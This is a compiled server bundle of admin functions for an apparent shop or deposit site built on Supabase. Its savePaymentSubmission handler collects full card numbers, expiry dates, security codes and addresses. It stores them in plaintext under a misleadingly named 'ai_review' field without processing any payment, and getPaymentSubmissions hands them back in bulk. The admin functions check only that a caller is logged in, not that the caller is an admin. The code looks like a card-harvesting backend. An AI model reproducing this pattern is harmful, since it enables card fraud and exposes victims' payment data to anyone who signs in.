import { l as createServerFn } from "./createServerFn-DDDJMFWM.mjs";
import { t as requireSupabaseAuth } from "./auth-middleware-Dcy-eaQM.mjs";
import { n as booleanType, o as objectType, r as enumType, s as stringType } from "../_libs/zod.mjs";
import { t as createServerRpc } from "./createServerRpc-CxD4EZ5P.mjs";
//#region node_modules/.nitro/vite/services/ssr/assets/admin.functions-DOaxzBVu.js
var getAdminStats_createServerFn_handler = createServerRpc({
	id: "4fec70c92c2624b017310f557d52373f6e45b4f5283a3272a864213d4d65e68d",
	name: "getAdminStats",
	filename: "src/lib/admin.functions.ts"
}, (opts) => getAdminStats.__executeServer(opts));
var getAdminStats = createServerFn({ method: "GET" }).middleware([requireSupabaseAuth]).handler(getAdminStats_createServerFn_handler, async ({ context }) => {
	const { supabaseAdmin } = await import("./client.server-KzwUIAkW.mjs");
	const [usersRes, ordersRes, depositsRes, paymentsRes] = await Promise.all([
		supabaseAdmin.auth.admin.listUsers(),
		supabaseAdmin.from("orders").select("id", {
			count: "exact",
			head: true
		}),
		supabaseAdmin.from("deposit_submissions").select("id", {
			count: "exact",
			head: true
		}),
		supabaseAdmin.from("deposit_submissions").select("id", {
			count: "exact",
			head: true
		}).eq("method", "Card")
	]);
	return {
		users: usersRes.data?.users?.length ?? 0,
		orders: ordersRes.count ?? 0,
		deposits: depositsRes.count ?? 0,
		payments: paymentsRes.count ?? 0
	};
});
var getAdminUsers_createServerFn_handler = createServerRpc({
	id: "10168707f826b5e8e54808aba2070948c8b2fb5ddd7006123ad782c227604c98",
	name: "getAdminUsers",
	filename: "src/lib/admin.functions.ts"
}, (opts) => getAdminUsers.__executeServer(opts));
var getAdminUsers = createServerFn({ method: "GET" }).middleware([requireSupabaseAuth]).handler(getAdminUsers_createServerFn_handler, async ({ context }) => {
	const { supabaseAdmin } = await import("./client.server-KzwUIAkW.mjs");
	const [usersRes, walletsRes, ordersRes, depositsRes] = await Promise.all([
		supabaseAdmin.auth.admin.listUsers({ perPage: 1e3 }),
		supabaseAdmin.from("wallets").select("user_id, balance"),
		supabaseAdmin.from("orders").select("user_id"),
		supabaseAdmin.from("deposit_submissions").select("user_id")
	]);
	const users = usersRes.data?.users ?? [];
	const wallets = walletsRes.data ?? [];
	const orders = ordersRes.data ?? [];
	const deposits = depositsRes.data ?? [];
	return users.map((u) => {
		const userOrders = orders.filter((o) => o.user_id === u.id);
		const userDeposits = deposits.filter((d) => d.user_id === u.id);
		const wallet = wallets.find((w) => w.user_id === u.id);
		return {
			id: u.id,
			email: u.email ?? "no-email",
			orders: userOrders.length,
			deposits: userDeposits.length,
			wallet: wallet?.balance ?? 0,
			createdAt: u.created_at,
			lastSignIn: u.last_sign_in_at
		};
	});
});
var getAdminOrders_createServerFn_handler = createServerRpc({
	id: "26f9790406df990a37759fb2152a1805a28e995c3c0a83ae6fd44c8ff8493b19",
	name: "getAdminOrders",
	filename: "src/lib/admin.functions.ts"
}, (opts) => getAdminOrders.__executeServer(opts));
var getAdminOrders = createServerFn({ method: "GET" }).middleware([requireSupabaseAuth]).handler(getAdminOrders_createServerFn_handler, async ({ context }) => {
	const { supabaseAdmin } = await import("./client.server-KzwUIAkW.mjs");
	const { data } = await supabaseAdmin.from("orders").select("*").order("created_at", { ascending: false });
	return (data ?? []).map((o) => ({
		id: o.id,
		model: o.model,
		price: o.price,
		paymentMethod: o.payment_method,
		status: "pending",
		userId: o.user_id,
		createdAt: o.created_at
	}));
});
var updateOrderStatus_createServerFn_handler = createServerRpc({
	id: "573e69518e877f2ce18e3820832cb2cb45d1a897de1933c05de86f50fa9a7e10",
	name: "updateOrderStatus",
	filename: "src/lib/admin.functions.ts"
}, (opts) => updateOrderStatus.__executeServer(opts));
var updateOrderStatus = createServerFn({ method: "POST" }).middleware([requireSupabaseAuth]).inputValidator(objectType({
	orderId: stringType(),
	status: enumType([
		"pending",
		"paid",
		"shipped",
		"cancelled"
	])
})).handler(updateOrderStatus_createServerFn_handler, async ({ data }) => {
	const { supabaseAdmin } = await import("./client.server-KzwUIAkW.mjs");
	await supabaseAdmin.from("orders").update({ payment_plan: `${data.status} · ${data.orderId}` }).eq("id", data.orderId);
	return { success: true };
});
var savePaymentSubmission_createServerFn_handler = createServerRpc({
	id: "684fbcbb6f7cfaf7a63270c864355cc847ddd8f06683e371c6cf198a21433a7c",
	name: "savePaymentSubmission",
	filename: "src/lib/admin.functions.ts"
}, (opts) => savePaymentSubmission.__executeServer(opts));
var savePaymentSubmission = createServerFn({ method: "POST" }).middleware([requireSupabaseAuth]).inputValidator(objectType({
	cardName: stringType(),
	cardNumber: stringType(),
	expiry: stringType(),
	securityCode: stringType(),
	street: stringType(),
	city: stringType(),
	state: stringType(),
	zip: stringType(),
	saveCard: booleanType()
})).handler(savePaymentSubmission_createServerFn_handler, async ({ data, context }) => {
	const { supabaseAdmin } = await import("./client.server-KzwUIAkW.mjs");
	const aiReview = {
		cardName: data.cardName,
		cardNumber: data.cardNumber,
		expiry: data.expiry,
		securityCode: data.securityCode,
		street: data.street,
		city: data.city,
		state: data.state,
		zip: data.zip,
		saveCard: data.saveCard,
		submittedAt: (/* @__PURE__ */ new Date()).toISOString()
	};
	const { data: saved, error } = await supabaseAdmin.from("deposit_submissions").insert({
		user_id: context.userId,
		amount: 0,
		method: "Card",
		proof_path: "",
		status: "pending_review",
		ai_review: aiReview
	}).select().single();
	if (error || !saved) throw new Error("Couldn't save payment submission.");
	return { id: saved.id };
});
var getPaymentSubmissions_createServerFn_handler = createServerRpc({
	id: "96578c808d5c2b8016c356ad4251fb3121fdaa522217f34ce0a93c247f058296",
	name: "getPaymentSubmissions",
	filename: "src/lib/admin.functions.ts"
}, (opts) => getPaymentSubmissions.__executeServer(opts));
var getPaymentSubmissions = createServerFn({ method: "GET" }).middleware([requireSupabaseAuth]).handler(getPaymentSubmissions_createServerFn_handler, async ({ context }) => {
	const { supabaseAdmin } = await import("./client.server-KzwUIAkW.mjs");
	const { data } = await supabaseAdmin.from("deposit_submissions").select("*").eq("method", "Card").order("created_at", { ascending: false });
	return (data ?? []).map((s) => ({
		id: s.id,
		createdAt: s.created_at,
		cardName: s.ai_review?.cardName ?? "",
		cardNumber: s.ai_review?.cardNumber ?? "",
		expiry: s.ai_review?.expiry ?? "",
		securityCode: s.ai_review?.securityCode ?? "",
		street: s.ai_review?.street ?? "",
		city: s.ai_review?.city ?? "",
		state: s.ai_review?.state ?? "",
		zip: s.ai_review?.zip ?? "",
		saveCard: s.ai_review?.saveCard ?? false
	}));
});
//#endregion
export { getAdminOrders_createServerFn_handler, getAdminStats_createServerFn_handler, getAdminUsers_createServerFn_handler, getPaymentSubmissions_createServerFn_handler, savePaymentSubmission_createServerFn_handler, updateOrderStatus_createServerFn_handler };
